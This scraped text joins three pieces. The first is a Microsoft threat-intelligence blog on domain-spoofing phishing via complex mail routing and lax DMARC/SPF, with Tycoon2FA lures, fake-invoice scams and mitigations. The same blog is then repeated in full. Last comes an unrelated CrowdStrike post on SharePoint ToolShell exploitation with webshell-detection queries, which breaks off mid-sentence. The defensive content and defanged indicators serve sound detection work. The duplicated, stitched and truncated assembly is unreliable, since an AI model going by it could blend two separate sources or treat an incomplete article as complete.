Content types Research Products and services Microsoft Defender Microsoft Defender for Cloud Apps Microsoft Defender for Office 365 Microsoft Defender XDR Microsoft Entra Microsoft Entra ID Topics Threat intelligence Phishing actors are exploiting complex routing scenarios and misconfigured spoof protections to effectively spoof organizations\u2019 domains and deliver phishing emails that appear, superficially, to have been sent internally. Threat actors have leveraged this vector to deliver a wide variety of phishing messages related to various phishing-as-a-service (PhaaS) platforms such as Tycoon2FA. These include messages with lures themed around voicemails, shared documents, communications from human resources (HR) departments, password resets or expirations, and others, leading to credential phishing. This attack vector is not new but has seen increased visibility and use since May 2025. The phishing campaigns Microsoft has observed using this attack vector are opportunistic rather than targeted in nature, with messages sent to a wide variety of organizations across several industries and verticals. Notably, Microsoft has also observed a campaign leveraging this vector to conduct financial scams against organizations. While these attacks share many characteristics with other credential phishing email campaigns, the attack vector abusing complex routing and improperly configured spoof protections distinguishes these campaigns. The phishing attack vector covered in this blog post does not affect customers whose Microsoft Exchange mail exchanger (MX) records point to Office 365; these tenants are protected by native built-in spoofing detections. Phishing messages sent through this vector may be more effective as they appear to be internally sent messages. Successful credential compromise through phishing attacks may lead to data theft or business email compromise (BEC) attacks against the affected organization or partners and may require extensive remediation efforts, and/or lead to loss of funds in the case of financial scams. While Microsoft detects the majority of these phishing attack attempts, organizations can further reduce risk by properly configuring spoof protections and any third-party connectors to prevent spoofed phish or scam messages sent through this attack vector from reaching inboxes. In this blog, we explain how threat actors are exploiting these routing scenarios and provide observations from related attacks. We provide specific examples\u2014including technical analysis of phishing messages, spoof protections, and email headers\u2014to help identify this attack vector. This blog also provides additional resources with information on how to set up mail flow rules, enforce spoof protections, and configure third-party connectors to prevent spoofed phishing messages from reaching user inboxes. Spoofed phishing attacks In cases where a tenant has configured a complex routing scenario, where the MX records are not pointed to Office 365, and the tenant has not configured strictly enforced spoof protections, threat actors may be able to send spoofed phishing messages that appear to have come from the tenant\u2019s own domain. Setting strict Domain-based Message Authentication, Reporting, and Conformance (DMARC) reject and SPF hard fail (rather than soft fail) policies and properly configuring any third-party connectors will prevent phishing attacks spoofing organizations\u2019 domains. This vector is not, as has been publicly reported, a vulnerability of Direct Send , a mail flow method in Microsoft 365 Exchange Online that allows devices (like printers, scanners), applications, or third-party services to send email without authentication using the organization\u2019s accepted domain, but rather takes advantage of complex routing scenarios and misconfigured spoof protections. Tenants with MX records pointed directly to Office 365 are not vulnerable to this attack vector of sending spoofed phishing messages. As with most other phishing attacks observed by Microsoft Threat intelligence throughout 2025, the bulk of phishing campaigns observed using this attack vector employ the Tycoon2FA PhaaS platform , in addition to several other phishing services in use as well. In October 2025, Microsoft Defender for Office 365 blocked more than 13 million malicious emails linked to Tycoon2FA, including many attacks spoofing organizations\u2019 domains. PhaaS platforms such as Tycoon2FA provide threat actors with a suite of capabilities, support, and ready-made lures and infrastructure to carry out phishing attacks and compromise credentials. These capabilities include adversary-in-the-middle (AiTM) phishing, which is intended to circumvent multifactor authentication (MFA) protections. Credential phishing attacks sent through this method employ a variety of themes such as voicemail notifications, password resets, HR communications, among others. Microsoft Threat Intelligence has also observed emails intended to trick organizations into paying fake invoices, potentially leading to financial losses. Generally, in these spoofed phishing attacks, the recipient email address is used in both the \u201cTo\u201d and \u201cFrom\u201d fields of the email, though some attacks will change the display name of the sender to make the attack more convincing and the \u201cFrom\u201d field could contain any valid internal email address. Credential phishing with spoofed emails The bulk of phishing messages sent through this attack vector uses the same lures as conventionally sent phishing messages, masquerading as services such as Docusign, or communications from HR regarding salary or benefits changes, password resets, and so on. They may employ clickable links in the email body or QR codes in attachments or other means of getting the recipient to navigate to a phish landing page. The appearance of having been sent from an internal email address is the most visible distinction to an end user, often with the same email address used in the \u201cTo\u201d and \u201cFrom\u201d fields. Email headers provide more information regarding the delivery of spoofed phishing emails, such as the appearance of an external IP address used by the threat actor to initiate the phishing attack. Depending on the configuration of the tenant, there will be SPF soft or hard fail, DMARC fail, and DKIM will equal none as both the sender and recipient appear to be in the same domain. At a basic level of protection, these should cause a message to land in a spam folder, but a user may retrieve and interact with phishing messages routed to spam. The X-MS-Exchange-Organization-InternalOrgSender will be set to True , but X-MS-Exchange-Organization-MessageDirectionality will be set to Incoming and X-MS-Exchange-Organization-ASDirectionalityType will have a value of \u201c1\u201d, indicating that the message was sent from outside of the organization. The combination of internal organization sender and incoming directionality is indicative of a message spoofed to appear as an internal communication, but not necessarily indicative of maliciousness. X-MS-Exchange-Organization-AuthAs will be set to Anonymous , indicating that the message came from an external source. The Authentication-Results header example provided below illustrates the result of enforced authentication. 000 is an explicit DMARC failure. The resultant action is either reject or quarantine . The headers shown here are examples of properly configured environments, effectively blocking phishing emails sent through this attack vector: spf=fail (sender IP is 51.89.59[.]188) smtp.mailfrom=contoso.com; dkim=none (message not signed) header.d=none;dmarc=fail action=quarantine header.from=contoso.com;compauth=fail reason=000 spf=fail (sender IP is 51.68.182[.]101) smtp.mailfrom= contoso.com; dkim=none (message not signed) header.d=none;dmarc=fail action=oreject header.from=contoso.com; Any third-party connectors\u2014such as a spam filtering service, security solution, or archiving service\u2014must be configured properly or spoof detections cannot be calculated correctly, allowing phishing emails such as the examples below to be delivered. The first of these examples indicate the expected authentication failures in the header, but no action is taken due to reason 905, which indicates that the tenant has set up complex routing where the mail exchanger record (MX record) points to either an on-premises Exchange environment or a third-party service before reaching Microsoft 365: spf=fail (sender IP is 176.111.219[.]85) smtp.mailfrom= contoso.com; dkim=none (message not signed) header.d=none;dmarc=fail action=none header.from= contoso.com;compauth=none reason=905 The phishing message masquerades as a notification from Microsoft Office 365 informing the recipient that their password will soon expire, although the subject line appears to be intended for a voicemail themed lure. The link in the email is a nested Google Maps URL pointing to an actor-controlled domain at online.amphen0l-fci[.]com . Figure 1. This phishing message uses a \u201cpassword expiration\u201d lure masquerading as a communication from Microsoft. The second example also shows the expected authentication failures, but with an action of \u201coreject\u201d with reason 451, indicating complex routing and that the message was delivered to the spam folder. spf=softfail (sender IP is 162.19.129[.]232) smtp.mailfrom=contoso.com; dkim=none (message not signed) header.d=none;dmarc=fail action=oreject header.from=contoso.com;compauth=none reason=451 This email masquerades as a SharePoint communication asking the recipient to review a shared document. The sender and recipient addresses are the same, though the threat actor has set the display name of the sender to \u201cPending Approval\u201d. The InternalOrgSender header is set to True . On the surface, this appears to be an internally sent email, though the use of the recipient\u2019s address in both the \u201cTo\u201d and \u201cFrom\u201d fields may alert an end user that this message is not legitimate. Figure 2. This phishing message uses a \u201cshared document\u201d lure masquerading as SharePoint. The nested Google URL in the email body points to actor-controlled domain scanuae[.]com . This domain acts as a redirector, loading a script that constructs a URL using the recipient\u2019s Base64-encoded email before loading a custom CAPTCHA page on the Tycoon2FA domain valoufroo.in[.]net . A sample of the script loaded on scanuae[.]com is shown here: Figure 3. This script crafts and redirects to a URL on a Tycoon2FA PhaaS domain. The below example of the custom CAPTCHA page is loaded at the Tycoon2FA domain goorooyi.yoshemo.in[.]net . The CAPTCHA is one of many similar CAPTCHAs observed in relation to Tycoon2FA phishing sequences. Clicking through it leads to a Tycoon2FA phish landing page where the recipient is prompted to input their credentials. Alternatively, clicking through the CAPTCHA may lead to a benign page on a legitimate domain, a tactic intended to evade detection and analysis. Figure 4. A custom CAPTCHA loaded on the Tycoon2FA PhaaS domain. Spoofed email financial scams Microsoft Threat Intelligence has also observed financial scams sent through spoofed emails. These messages are crafted to look like an email thread between a highly placed employee at the targeted organization, often the CEO of the organization, an individual requesting payment for services rendered, or the accounting department at the targeted organization. In this example, the message was initiated from 163.5.169[.]67 and authentication failures were not enforced, as DMARC is set to none and action is set to none , a permissive mode that does not protect against spoofed messages, allowing the message to reach the inbox on a tenant whose MX record is not pointed to Office 365. Authentication-Results spf=fail (sender IP is 163.5.169[.]67) smtp.mailfrom=contoso.com; dkim=none (message not signed) header.d=none;dmarc=none action=none header.from=contoso.com;compauth=fail reason=601 The scam message is crafted to appear as an email thread with a previous message between the CEO of the targeted organization, using the CEO\u2019s real name, and an individual requesting payment of an invoice. The name of the individual requesting payment (here replaced with \u201cJohn Doe\u201d) appears to be a real person, likely a victim of identity theft. The \u201cTo\u201d and \u201cFrom\u201d fields both use the address for the accounting department at the targeted organization, but with the CEO\u2019s name used as the display name in the \u201cFrom\u201d field. As with our previous examples, this email superficially appears to be internal to the organization, with only the use of the same address as sender and recipient indicating that the message may not be legitimate. The body of the message also attempts to instill a sense of urgency, asking for prompt payment to retain a discount. Figure 5. An email crafted to appear as part of an ongoing thread directing a company\u2019s accounting department to pay a fake invoice. Figure 6. Included as part of the message shown above, this is crafted to appear as an earlier communication between the CEO of the company and an individual seeking payment. Most of the emails observed as part of this campaign include three attached files. The first is the fake invoice requesting several thousand dollars to be sent through ACH payment to a bank account at an online banking company. The name of the individual requesting payment is also listed along with a fake company name and address. The bank account was likely set up using the individual\u2019s stolen personally identifiable information. Figure 7. A fake invoice including banking information attached to the scam messages. The second attachment (not pictured) is an IRS W-9 form that lists the name and social security number of the individual used to set up the bank account. The third attachment is a fake \u201cbank letter\u201d ostensibly provided by an employee at the online bank used to set up the fraudulent account. The letter provides the same banking information as the invoice and attempts to add another layer of believability to the scam. Figure 8. A fake \u201cbank letter\u201d also attached to the scam messages. Falling victim to this scam could result in significant financial losses that may not be recoverable as the funds will likely be moved quickly by the actor in control of the fraudulent bank account.

Review our recommended settings for Exchange Online Protection and Microsoft Defender for Office 365. Configure Microsoft Defender for Office 365 to recheck links on click. Safe Links provides URL scanning and rewriting of inbound email messages in mail flow, and time-of-click verification of URLs and links in email messages, other Microsoft 365 applications such as Teams, and other locations such as SharePoint Online. Safe Links scanning occurs in addition to the regular anti-spam and anti-malware protection in inbound email messages in Microsoft Exchange Online Protection (EOP). Safe Links scanning can help protect your organization from malicious links used in phishing and other attacks. Turn on Zero-hour auto purge (ZAP ) in Defender for Office 365 to quarantine sent mail in response to newly-acquired threat intelligence and retroactively neutralize malicious phishing, spam, or malware messages that have already been delivered to mailboxes. Encourage users to use Microsoft Edge and other web browsers that support Microsoft Defender SmartScreen , which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that host malware. Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attack tools and techniques. Cloud-based machine learning protections block a majority of new and unknown variants Configure Microsoft Entra with increased security . Pilot and deploy phishing-resistant authentication methods for users. Implement Entra ID Conditional Access authentication strength to require phishing-resistant authentication for employees and external users for critical apps. Mitigating threats from phishing actors begins with securing user identity by eliminating traditional credentials and adopting passwordless, phishing-resistant MFA methods such as FIDO2 security keys, Windows Hello for Business, and Microsoft Authenticator passkeys. Microsoft recommends enforcing phishing-resistant MFA for privileged roles in Microsoft Entra ID to significantly reduce the risk of account compromise. Learn how to require phishing-resistant MFA for admin roles and plan a passwordless deployment . Passwordless authentication improves security as well as enhances user experience and reduces IT overhead. Explore Microsoft\u2019s overview of passwordless authentication and authentication strength guidance to understand how to align your organization\u2019s policies with best practices. For broader strategies on defending against identity-based attacks, refer to Microsoft\u2019s blog on evolving identity attack techniques . If Microsoft Defender alerts indicate suspicious activity or confirmed compromised account or a system, it\u2019s essential to act quickly and thoroughly. Below are recommended remediation steps for each affected identity: Reset credentials \u2013 Immediately reset the account\u2019s password and revoke any active sessions or tokens. This ensures that any stolen credentials can no longer be used. Re-register or remove MFA devices \u2013 Review users MFA devices, specifically those recently added or updated. Revert unauthorized payroll or financial changes \u2013 If the attacker modified payroll or financial configurations, such as direct deposit details, revert them to their original state and notify the appropriate internal teams. Remove malicious inbox rules \u2013 Attackers often create inbox rules to hide their activity or forward sensitive data. Review and delete any suspicious or unauthorized rules. Verify MFA reconfiguration \u2013 Confirm that the user has successfully reconfigured MFA and that the new setup uses secure, phishing-resistant methods.

Content types Research Products and services Microsoft Defender Microsoft Defender for Cloud Apps Microsoft Defender for Office 365 Microsoft Defender XDR Microsoft Entra Microsoft Entra ID Topics Threat intelligence Phishing actors are exploiting complex routing scenarios and misconfigured spoof protections to effectively spoof organizations\u2019 domains and deliver phishing emails that appear, superficially, to have been sent internally. Threat actors have leveraged this vector to deliver a wide variety of phishing messages related to various phishing-as-a-service (PhaaS) platforms such as Tycoon2FA. These include messages with lures themed around voicemails, shared documents, communications from human resources (HR) departments, password resets or expirations, and others, leading to credential phishing. This attack vector is not new but has seen increased visibility and use since May 2025. The phishing campaigns Microsoft has observed using this attack vector are opportunistic rather than targeted in nature, with messages sent to a wide variety of organizations across several industries and verticals. Notably, Microsoft has also observed a campaign leveraging this vector to conduct financial scams against organizations. While these attacks share many characteristics with other credential phishing email campaigns, the attack vector abusing complex routing and improperly configured spoof protections distinguishes these campaigns. The phishing attack vector covered in this blog post does not affect customers whose Microsoft Exchange mail exchanger (MX) records point to Office 365; these tenants are protected by native built-in spoofing detections. Phishing messages sent through this vector may be more effective as they appear to be internally sent messages. Successful credential compromise through phishing attacks may lead to data theft or business email compromise (BEC) attacks against the affected organization or partners and may require extensive remediation efforts, and/or lead to loss of funds in the case of financial scams. While Microsoft detects the majority of these phishing attack attempts, organizations can further reduce risk by properly configuring spoof protections and any third-party connectors to prevent spoofed phish or scam messages sent through this attack vector from reaching inboxes. In this blog, we explain how threat actors are exploiting these routing scenarios and provide observations from related attacks. We provide specific examples\u2014including technical analysis of phishing messages, spoof protections, and email headers\u2014to help identify this attack vector. This blog also provides additional resources with information on how to set up mail flow rules, enforce spoof protections, and configure third-party connectors to prevent spoofed phishing messages from reaching user inboxes. Spoofed phishing attacks In cases where a tenant has configured a complex routing scenario, where the MX records are not pointed to Office 365, and the tenant has not configured strictly enforced spoof protections, threat actors may be able to send spoofed phishing messages that appear to have come from the tenant\u2019s own domain. Setting strict Domain-based Message Authentication, Reporting, and Conformance (DMARC) reject and SPF hard fail (rather than soft fail) policies and properly configuring any third-party connectors will prevent phishing attacks spoofing organizations\u2019 domains. This vector is not, as has been publicly reported, a vulnerability of Direct Send , a mail flow method in Microsoft 365 Exchange Online that allows devices (like printers, scanners), applications, or third-party services to send email without authentication using the organization\u2019s accepted domain, but rather takes advantage of complex routing scenarios and misconfigured spoof protections. Tenants with MX records pointed directly to Office 365 are not vulnerable to this attack vector of sending spoofed phishing messages. As with most other phishing attacks observed by Microsoft Threat intelligence throughout 2025, the bulk of phishing campaigns observed using this attack vector employ the Tycoon2FA PhaaS platform , in addition to several other phishing services in use as well. In October 2025, Microsoft Defender for Office 365 blocked more than 13 million malicious emails linked to Tycoon2FA, including many attacks spoofing organizations\u2019 domains. PhaaS platforms such as Tycoon2FA provide threat actors with a suite of capabilities, support, and ready-made lures and infrastructure to carry out phishing attacks and compromise credentials. These capabilities include adversary-in-the-middle (AiTM) phishing, which is intended to circumvent multifactor authentication (MFA) protections. Credential phishing attacks sent through this method employ a variety of themes such as voicemail notifications, password resets, HR communications, among others. Microsoft Threat Intelligence has also observed emails intended to trick organizations into paying fake invoices, potentially leading to financial losses. Generally, in these spoofed phishing attacks, the recipient email address is used in both the \u201cTo\u201d and \u201cFrom\u201d fields of the email, though some attacks will change the display name of the sender to make the attack more convincing and the \u201cFrom\u201d field could contain any valid internal email address. Credential phishing with spoofed emails The bulk of phishing messages sent through this attack vector uses the same lures as conventionally sent phishing messages, masquerading as services such as Docusign, or communications from HR regarding salary or benefits changes, password resets, and so on. They may employ clickable links in the email body or QR codes in attachments or other means of getting the recipient to navigate to a phish landing page. The appearance of having been sent from an internal email address is the most visible distinction to an end user, often with the same email address used in the \u201cTo\u201d and \u201cFrom\u201d fields. Email headers provide more information regarding the delivery of spoofed phishing emails, such as the appearance of an external IP address used by the threat actor to initiate the phishing attack. Depending on the configuration of the tenant, there will be SPF soft or hard fail, DMARC fail, and DKIM will equal none as both the sender and recipient appear to be in the same domain. At a basic level of protection, these should cause a message to land in a spam folder, but a user may retrieve and interact with phishing messages routed to spam. The X-MS-Exchange-Organization-InternalOrgSender will be set to True , but X-MS-Exchange-Organization-MessageDirectionality will be set to Incoming and X-MS-Exchange-Organization-ASDirectionalityType will have a value of \u201c1\u201d, indicating that the message was sent from outside of the organization. The combination of internal organization sender and incoming directionality is indicative of a message spoofed to appear as an internal communication, but not necessarily indicative of maliciousness. X-MS-Exchange-Organization-AuthAs will be set to Anonymous , indicating that the message came from an external source. The Authentication-Results header example provided below illustrates the result of enforced authentication. 000 is an explicit DMARC failure. The resultant action is either reject or quarantine . The headers shown here are examples of properly configured environments, effectively blocking phishing emails sent through this attack vector: spf=fail (sender IP is 51.89.59[.]188) smtp.mailfrom=contoso.com; dkim=none (message not signed) header.d=none;dmarc=fail action=quarantine header.from=contoso.com;compauth=fail reason=000 spf=fail (sender IP is 51.68.182[.]101) smtp.mailfrom= contoso.com; dkim=none (message not signed) header.d=none;dmarc=fail action=oreject header.from=contoso.com; Any third-party connectors\u2014such as a spam filtering service, security solution, or archiving service\u2014must be configured properly or spoof detections cannot be calculated correctly, allowing phishing emails such as the examples below to be delivered. The first of these examples indicate the expected authentication failures in the header, but no action is taken due to reason 905, which indicates that the tenant has set up complex routing where the mail exchanger record (MX record) points to either an on-premises Exchange environment or a third-party service before reaching Microsoft 365: spf=fail (sender IP is 176.111.219[.]85) smtp.mailfrom= contoso.com; dkim=none (message not signed) header.d=none;dmarc=fail action=none header.from= contoso.com;compauth=none reason=905 The phishing message masquerades as a notification from Microsoft Office 365 informing the recipient that their password will soon expire, although the subject line appears to be intended for a voicemail themed lure. The link in the email is a nested Google Maps URL pointing to an actor-controlled domain at online.amphen0l-fci[.]com . Figure 1. This phishing message uses a \u201cpassword expiration\u201d lure masquerading as a communication from Microsoft. The second example also shows the expected authentication failures, but with an action of \u201coreject\u201d with reason 451, indicating complex routing and that the message was delivered to the spam folder. spf=softfail (sender IP is 162.19.129[.]232) smtp.mailfrom=contoso.com; dkim=none (message not signed) header.d=none;dmarc=fail action=oreject header.from=contoso.com;compauth=none reason=451 This email masquerades as a SharePoint communication asking the recipient to review a shared document. The sender and recipient addresses are the same, though the threat actor has set the display name of the sender to \u201cPending Approval\u201d. The InternalOrgSender header is set to True . On the surface, this appears to be an internally sent email, though the use of the recipient\u2019s address in both the \u201cTo\u201d and \u201cFrom\u201d fields may alert an end user that this message is not legitimate. Figure 2. This phishing message uses a \u201cshared document\u201d lure masquerading as SharePoint. The nested Google URL in the email body points to actor-controlled domain scanuae[.]com . This domain acts as a redirector, loading a script that constructs a URL using the recipient\u2019s Base64-encoded email before loading a custom CAPTCHA page on the Tycoon2FA domain valoufroo.in[.]net . A sample of the script loaded on scanuae[.]com is shown here: Figure 3. This script crafts and redirects to a URL on a Tycoon2FA PhaaS domain. The below example of the custom CAPTCHA page is loaded at the Tycoon2FA domain goorooyi.yoshemo.in[.]net . The CAPTCHA is one of many similar CAPTCHAs observed in relation to Tycoon2FA phishing sequences. Clicking through it leads to a Tycoon2FA phish landing page where the recipient is prompted to input their credentials. Alternatively, clicking through the CAPTCHA may lead to a benign page on a legitimate domain, a tactic intended to evade detection and analysis. Figure 4. A custom CAPTCHA loaded on the Tycoon2FA PhaaS domain. Spoofed email financial scams Microsoft Threat Intelligence has also observed financial scams sent through spoofed emails. These messages are crafted to look like an email thread between a highly placed employee at the targeted organization, often the CEO of the organization, an individual requesting payment for services rendered, or the accounting department at the targeted organization. In this example, the message was initiated from 163.5.169[.]67 and authentication failures were not enforced, as DMARC is set to none and action is set to none , a permissive mode that does not protect against spoofed messages, allowing the message to reach the inbox on a tenant whose MX record is not pointed to Office 365. Authentication-Results spf=fail (sender IP is 163.5.169[.]67) smtp.mailfrom=contoso.com; dkim=none (message not signed) header.d=none;dmarc=none action=none header.from=contoso.com;compauth=fail reason=601 The scam message is crafted to appear as an email thread with a previous message between the CEO of the targeted organization, using the CEO\u2019s real name, and an individual requesting payment of an invoice. The name of the individual requesting payment (here replaced with \u201cJohn Doe\u201d) appears to be a real person, likely a victim of identity theft. The \u201cTo\u201d and \u201cFrom\u201d fields both use the address for the accounting department at the targeted organization, but with the CEO\u2019s name used as the display name in the \u201cFrom\u201d field. As with our previous examples, this email superficially appears to be internal to the organization, with only the use of the same address as sender and recipient indicating that the message may not be legitimate. The body of the message also attempts to instill a sense of urgency, asking for prompt payment to retain a discount. Figure 5. An email crafted to appear as part of an ongoing thread directing a company\u2019s accounting department to pay a fake invoice. Figure 6. Included as part of the message shown above, this is crafted to appear as an earlier communication between the CEO of the company and an individual seeking payment. Most of the emails observed as part of this campaign include three attached files. The first is the fake invoice requesting several thousand dollars to be sent through ACH payment to a bank account at an online banking company. The name of the individual requesting payment is also listed along with a fake company name and address. The bank account was likely set up using the individual\u2019s stolen personally identifiable information. Figure 7. A fake invoice including banking information attached to the scam messages. The second attachment (not pictured) is an IRS W-9 form that lists the name and social security number of the individual used to set up the bank account. The third attachment is a fake \u201cbank letter\u201d ostensibly provided by an employee at the online bank used to set up the fraudulent account. The letter provides the same banking information as the invoice and attempts to add another layer of believability to the scam. Figure 8. A fake \u201cbank letter\u201d also attached to the scam messages. Falling victim to this scam could result in significant financial losses that may not be recoverable as the funds will likely be moved quickly by the actor in control of the fraudulent bank account.

Review our recommended settings for Exchange Online Protection and Microsoft Defender for Office 365. Configure Microsoft Defender for Office 365 to recheck links on click. Safe Links provides URL scanning and rewriting of inbound email messages in mail flow, and time-of-click verification of URLs and links in email messages, other Microsoft 365 applications such as Teams, and other locations such as SharePoint Online. Safe Links scanning occurs in addition to the regular anti-spam and anti-malware protection in inbound email messages in Microsoft Exchange Online Protection (EOP). Safe Links scanning can help protect your organization from malicious links used in phishing and other attacks. Turn on Zero-hour auto purge (ZAP ) in Defender for Office 365 to quarantine sent mail in response to newly-acquired threat intelligence and retroactively neutralize malicious phishing, spam, or malware messages that have already been delivered to mailboxes. Encourage users to use Microsoft Edge and other web browsers that support Microsoft Defender SmartScreen , which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that host malware. Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attack tools and techniques. Cloud-based machine learning protections block a majority of new and unknown variants Configure Microsoft Entra with increased security . Pilot and deploy phishing-resistant authentication methods for users. Implement Entra ID Conditional Access authentication strength to require phishing-resistant authentication for employees and external users for critical apps. Mitigating threats from phishing actors begins with securing user identity by eliminating traditional credentials and adopting passwordless, phishing-resistant MFA methods such as FIDO2 security keys, Windows Hello for Business, and Microsoft Authenticator passkeys. Microsoft recommends enforcing phishing-resistant MFA for privileged roles in Microsoft Entra ID to significantly reduce the risk of account compromise. Learn how to require phishing-resistant MFA for admin roles and plan a passwordless deployment . Passwordless authentication improves security as well as enhances user experience and reduces IT overhead. Explore Microsoft\u2019s overview of passwordless authentication and authentication strength guidance to understand how to align your organization\u2019s policies with best practices. For broader strategies on defending against identity-based attacks, refer to Microsoft\u2019s blog on evolving identity attack techniques . If Microsoft Defender alerts indicate suspicious activity or confirmed compromised account or a system, it\u2019s essential to act quickly and thoroughly. Below are recommended remediation steps for each affected identity: Reset credentials \u2013 Immediately reset the account\u2019s password and revoke any active sessions or tokens. This ensures that any stolen credentials can no longer be used. Re-register or remove MFA devices \u2013 Review users MFA devices, specifically those recently added or updated. Revert unauthorized payroll or financial changes \u2013 If the attacker modified payroll or financial configurations, such as direct deposit details, revert them to their original state and notify the appropriate internal teams. Remove malicious inbox rules \u2013 Attackers often create inbox rules to hide their activity or forward sensitive data. Review and delete any suspicious or unauthorized rules. Verify MFA reconfiguration \u2013 Confirm that the user has successfully reconfigured MFA and that the new setup uses secure, phishing-resistant methods.

about this emerging threat and how CrowdStrike customers can use the Falcon platform to protect their environments. July 21, 2025 | CrowdStrike Engineering | From The Front Lines Beginning on July 18, 2025, at approximately 0700 UTC, CrowdStrike Falcon\u00ae Complete Next-Gen MDR and CrowdStrike Falcon\u00ae Adversary OverWatch\u2122 identified a wave of Microsoft SharePoint exploitation attempts by an unknown adversary. Two distinct zero-day vulnerabilities were made publicly available: a critical remote code execution vulnerability ( CVE-2025-53770 ) and a server spoofing vulnerability ( CVE-2025-53771 ). The chaining of these vulnerabilities to exploit a vulnerable SharePoint server is being referred to as \u201cToolShell.\u201d Since the start of this exploitation, CrowdStrike has observed and successfully blocked hundreds of exploitation attempts across 160+ customer environments, demonstrating both the scale of this threat and the effectiveness of our protection capabilities. The CrowdStrike Falcon\u00ae platform detects and protects against exploitation of the Microsoft SharePoint zero-days, blocking known behaviors associated with these vulnerabilities. This blog post provides context surrounding this emerging threat, as well as guidance for customers on how they can use the Falcon platform to protect their environments. Customers of CrowdStrike Falcon\u00ae Adversary Intelligence Premium can find more detailed analysis in Intel report CSA-250846. Observed Exploitation of SharePoint Vulnerability CrowdStrike has observed widespread exploitation of CVE-2025-53770 involving a deserialisation attack leading to attempts to write a malicious .aspx webshell on the host. That file, spinstall0.aspx , is used to steal IIS Machine Keys, which can later be used for other post-exploitation attacks. This attack begins with a specially crafted POST request to an accessible SharePoint server. The POST request payload will attempt to write the .aspx file via PowerShell. That malicious PowerShell command, spawned from the SharePoint IIS process, is blocked by the Falcon platform. Figure 1. Blocked PowerShell spawned from the SharePoint worker process w3wp.exe (click to open in new tab) We have tracked the size and speed of attempted payload delivery over time by mapping detections from the Falcon platform. The following timeline of activity has been observed: July 18 (morning UTC): A small number of SharePoint servers were attacked July 18 (1330-1845 UTC): Shortly after, likely following the publicity of the zero-day, the campaign ramped up significantly with 177 servers attacked on the same day July 19 (0600-0800 UTC): Exploitation recommenced briefly before temporarily ceasing July 21 (0740 UTC): Activity resumes with 32 servers attacked in four hours up to 1130 UTC Figure 2. Observed instances of attempted exploitation of SharePoint servers over time (click to open in new tab) Defending Against This Threat Organizations are strongly encouraged to apply patches that have been released to ensure they are protected. Microsoft has published customer guidance and released patches for Microsoft SharePoint Server 2019 Core , Microsoft SharePoint Server Subscription Edition , and Microsoft SharePoint Enterprise Server 2016 . CrowdStrike Falcon Endpoint Detection and Response As mentioned in our opening analysis, this attack relies on specially crafted POST requests to exploit the SharePoint zero-day vulnerabilities. CrowdStrike Falcon\u00ae Insight XDR endpoint security successfully detected and blocked these attacks through advanced behavioral analysis rather than relying on signature-based detections. The attack chain exploits SharePoint servers by executing malicious code to extract authentication keys, enabling attackers to send authenticated system-level commands. Falcon Insight XDR\u2019s behavioral engine identified suspicious activity when SharePoint processes began launching command prompts and PowerShell scripts \u2014 a clear deviation from normal SharePoint operations. Our multi-layered approach detected: Abnormal process behavior : Suspicious process chains originating from SharePoint services, including webshells and reconnaissance Network anomalies : Questionable DNS requests that generated alerts in the Falcon console Behavioral correlation : Multiple indicators confirming malicious intent Threat actors continuously adapt their techniques based on security vendor responses. CrowdStrike's threat research team proactively enhances our detection capabilities in response. We are deploying additional behavioral detections this week that focus on post-exploitation activities and alternative attack vectors, providing continued coverage as attack methods evolve. CrowdStrike Falcon Exposure Management Customers can find CVE-2025-53770 and CVE-2025-53771 with CrowdStrike Falcon\u00ae Exposure Management\u2019s vulnerability management capability. CrowdStrike has developed a custom dashboard for Falcon Exposure Management customers so they can quickly see which hosts are vulnerable. The dashboard includes threat analysis provided by researchers, detailed information on vulnerable hosts, and the count of vulnerable product versions. As with other custom dashboard releases, customers can access these predefined dashboards by navigating to Exposure management > Vulnerability management > Dashboards, then select this dashboard for ToolShell CVE-2025-53770. Figure 3. Custom Falcon Exposure Management dashboard providing visibility into CVE-2025-53770 (click to open in new tab) Falcon Exposure Management has had detections for all supported platforms since the vulnerability was initially disclosed. The vulnerability currently has an ExPRT.AI severity rating of \"Critical,\" with an exploit status of \"Actively Used (Critical)\" due to confirmed active exploitation in the wild. To identify vulnerable systems, customers can navigate to the Exposure Management > Vulnerability Management > Vulnerabilities page in the CrowdStrike Falcon platform. From there, they can use the Vulnerability ID filter with a value of \"CVE-2025-53770\" and/or \u201cCVE-2025-53771.\u201d If any of the managed systems are vulnerable, results will be shown here. If they receive the message \"No vulnerabilities found,\" then all of their managed SharePoint systems have the necessary patches. For any systems found vulnerable, the remediation guidance provided for that system will mention the necessary security updates to apply. CrowdStrike Falcon Next-Gen SIEM As the vulnerabilities discussed target the SharePoint server, ingestion of Microsoft IIS server logs provides a comprehensive view into this emerging threat. CrowdStrike Falcon\u00ae Next-Gen SIEM customers are encouraged to ingest IIS logs to gain the necessary visibility and detect malicious actions. Further information about ingesting and parsing this data source is available to customers here . The \u201cMicrosoft - IIS - Microsoft Sharepoint ToolShell Exploitation CVE-2025-53770\u201d rule template is currently available to customers who wish to detect possible exploitation attempts specific to CVE-2025-53770. This template leverages the following query to identify instances where malicious URLs are being accessed: #Vendor=\"microsoft\" #event.module=\"iis\" #event.dataset=\"iis.access\" #repo!=\"xdr*\" | parseUrl(http.request.referrer) | http.request.method=\"POST\" url.path=\"/_layouts/15/ToolPane.aspx\" url.query=\"DisplayMode=Edit&a=/ToolPane.aspx\" http.request.referrer.path=\"/_layouts/SignOut.aspx\" | http.response.status_code =~ in(values=[200,302,401]) Falcon Next-Gen SIEM users may also leverage a hunting query that uses the recently released correlate() capability. This rule , which is also provided below, may be used to identify instances where a SharePoint IIS process results in a PowerShell command being executed, followed by an ASPX file being written. correlate( cmd: { #event_simpleName=ProcessRollup2 event_platform=Win FileName=\"cmd.exe\" ParentBaseFileName=\"w3wp.exe\" } include: [aid, ComputerName, TargetProcessId, ParentBaseFileName, FileName, CommandLine], pwsh: { #event_simpleName=ProcessRollup2 event_platform=Win FileName=\"powershell.exe\" | aid <=> cmd.aid | ParentProcessId <=> cmd.TargetProcessId } include: [aid, ComputerName, TargetProcessId, ParentBaseFileName, FileName, CommandLine], aspx: { #event_simpleName=/^(NewScriptWritten|WebScriptFileWritten)$/ event_platform=Win FileName=/\\.aspx/i | aid <=> cmd.aid | ContextProcessId <=> pwsh.TargetProcessId } include: [aid, ComputerName, TargetFileName], sequence=true, within=5m) Conclusion The SharePoint 